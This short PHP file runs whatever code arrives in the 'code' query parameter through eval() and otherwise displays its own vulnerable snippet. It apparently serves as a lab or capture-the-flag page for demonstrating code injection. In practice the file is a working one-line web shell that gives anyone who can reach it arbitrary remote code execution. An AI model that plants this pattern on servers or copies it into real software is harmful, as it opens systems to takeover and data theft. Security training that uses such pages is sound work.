<?php

$string = <<<EOT
<?php
	\$code=\$_GET['code'];
	eval(\$code);
?>

EOT;
if(!empty($_GET['code']))
{
	$code=$_GET['code'];
	eval($code); 
} else {
	echo highlight_string($string, true);
}
?>
